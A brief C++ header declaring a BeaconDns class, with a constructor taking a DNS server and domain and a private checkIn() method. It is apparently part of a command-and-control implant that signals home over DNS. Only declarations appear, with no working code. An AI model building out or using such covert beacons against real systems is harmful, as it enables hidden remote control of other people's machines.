#pragma once

#include "Beacon.hpp"

namespace dns
{
    class Client;
}

class BeaconDns : public Beacon
{

public:
    BeaconDns(std::string& config, const std::string& dnsServer, const std::string& domain);
    ~BeaconDns();

private:
    void checkIn();

    dns::Client* m_client;
};
